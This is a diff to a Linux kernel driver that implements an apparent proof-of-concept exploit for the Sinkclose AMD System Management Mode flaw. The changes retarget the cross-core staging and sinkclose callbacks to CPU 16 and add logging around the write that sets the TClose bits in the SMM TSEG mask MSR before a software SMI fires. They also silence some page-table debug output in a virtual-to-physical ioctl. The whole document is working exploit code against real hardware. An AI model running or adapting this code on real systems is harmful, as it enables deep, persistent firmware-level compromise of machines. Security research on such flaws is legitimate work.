@@ -49,6 +49,7 @@ static int kernetix_ndevices = 1;
 static PKERNETIX_DEVICE kernetix_device = NULL;
 static struct class *device_class = NULL;
 
+#define CORENUM 16
 #define SINKCLOSE_CORE1_RECOVER_PHYSICAL_ADDR 0x3000
 #define CORE1_FAKE_STATE_AREA 0x200
 static void *sinkclose_core1_recover_vaddr;
@@ -90,18 +91,18 @@ static uint64_t va2pa(uint64_t virt_addr)
 
         if (is_pml5_enabled()) {
           uint64_t pml5 = cr3 & 0xFFFFFFFFF000;
-          printk(KERN_INFO "pml5: %016llx\n", pml5);
+          //printk(KERN_INFO "pml5: %016llx\n", pml5);
           uint64_t pml4_entry = *(uint64_t *)((pml5 + __PAGE_OFFSET) + (PML5_INDEX(virt_addr)) * 8);
           pml4 = (pml4_entry & PFN_MASK);
         } else {
           pml4 = cr3 & 0xFFFFFFFFF000;
         }
 
-        printk(KERN_INFO "pml4: %016llx\n", pml4);
+        //printk(KERN_INFO "pml4: %016llx\n", pml4);
 
         uint64_t pdpt_entry = *(uint64_t *)((pml4 + __PAGE_OFFSET) + (PML4_INDEX(virt_addr)) * 8);
         uint64_t pdpt = (pdpt_entry & PFN_MASK);
-        printk(KERN_INFO "pdpt: %016llx\n", pdpt);
+        //printk(KERN_INFO "pdpt: %016llx\n", pdpt);
         if (pdpt_entry & (1ULL << 7))
         { // Check if PDPTE is a large page
                 return pdpt;
@@ -189,14 +190,11 @@ static void write_msr_for_core(void *info) {
 }
 
 
-
-
-
 static atomic_t core1_staging_executed = ATOMIC_INIT(0);
 static atomic_t core1_staging_finished = ATOMIC_INIT(0);
 
 static void core1_staging(void *info) {
-    printk(KERN_INFO "CORE1 entering staging");
+    printk(KERN_INFO "CORE %d entering staging", smp_processor_id());
     // Set prepared to 0
     atomic_set(&core1_staging_finished, 0);
 
@@ -206,7 +204,7 @@ static void core1_staging(void *info) {
     // busy wait until SMI finishes
     while ((atomic_cmpxchg(&core1_staging_finished, 1, 1) != 1));
 
-    printk(KERN_INFO "CORE1 exiting Staging");
+    printk(KERN_INFO "CORE %d exiting Staging", smp_processor_id());
 }
 
 
@@ -214,7 +212,7 @@ static atomic_t core1_sinkclose_executed = ATOMIC_INIT(0);
 static atomic_t core1_sinkclose_finished = ATOMIC_INIT(0);
 
 static void core1_sinkclose(void *info) {
-    printk(KERN_INFO "CORE1 entering sinkclose");
+    printk(KERN_INFO "CORE %d entering sinkclose", smp_processor_id());
 
     // Set prepared to 0
     atomic_set(&core1_sinkclose_finished, 0);
@@ -232,7 +230,7 @@ static void core1_sinkclose(void *info) {
     while ((atomic_cmpxchg(&core1_sinkclose_finished, 1, 1) != 1));
       
 
-    printk(KERN_INFO "CORE1 exiting sinkclose");
+    printk(KERN_INFO "CORE %d exiting sinkclose", smp_processor_id());
 }
 
 #define AMD_MSR_SMM_TSEG_MASK  0xC0010113
@@ -253,7 +251,7 @@ static void sinkclose_exploit(void *info) {
 		    INIT_CSD(&csd, core1_staging, NULL);
 
         // Schedule the callback to be executed on CPU 1 asynchronously
-        smp_call_function_single_async(1, &csd);
+        smp_call_function_single_async(CORENUM, &csd);
 
         // Busy wait until Core1 executes
         while ((atomic_cmpxchg(&core1_staging_executed, 1, 1) != 1));
@@ -275,15 +273,22 @@ static void sinkclose_exploit(void *info) {
         INIT_CSD(&csd, core1_sinkclose, NULL);
 
         // Schedule the callback to be executed on CPU 1 asynchronously
-        smp_call_function_single_async(1, &csd);
+        smp_call_function_single_async(CORENUM, &csd);
 
         // Busy wait until Core1 executes
         while ((atomic_cmpxchg(&core1_sinkclose_executed, 1, 1) != 1));
 
         // Executes SWSMI with TClose Enabled
         _rdmsr(AMD_MSR_SMM_TSEG_MASK, &tseg_mask);
+        pr_info("TSEG Mask Before Overwrite: %016llx\n", tseg_mask);
         tseg_mask = tseg_mask | (0b11 << 2);
         _wrmsr(AMD_MSR_SMM_TSEG_MASK, tseg_mask);
+        _rdmsr(AMD_MSR_SMM_TSEG_MASK, &tseg_mask);
+        pr_info("TSEG Mask After Overwrite: %016llx\n", tseg_mask);
+        tseg_mask &= ~(0b11 << 2);
+        _wrmsr(AMD_MSR_SMM_TSEG_MASK, tseg_mask);
+        _rdmsr(AMD_MSR_SMM_TSEG_MASK, &tseg_mask);
+        pr_info("TSEG Restore: %016llx\n", tseg_mask);
         _swsmi(smi);
 
         // Signal Core1 that it can continue
@@ -761,12 +766,13 @@ static long int kernetix_ioctl(struct file *file,
         break;
 
         case IOCTL_VIRT_TO_PHYS:
-          printk(KERN_INFO "IOCTL_VIRT_TO_PHYS");
+          //printk(KERN_INFO "IOCTL_VIRT_TO_PHYS");
           err = copy_from_user(&_v2p, (void *)p, sizeof(struct virt_to_phys));
           if (err)
           {
             ret = -EINVAL;
           }
+          pr_info("vaddr: %016llx\n", _v2p.vaddr);
           _v2p.physaddr = (uint64_t)va2pa(_v2p.vaddr);
           if (copy_to_user((void *)p, &_v2p, sizeof(_v2p)))
           {
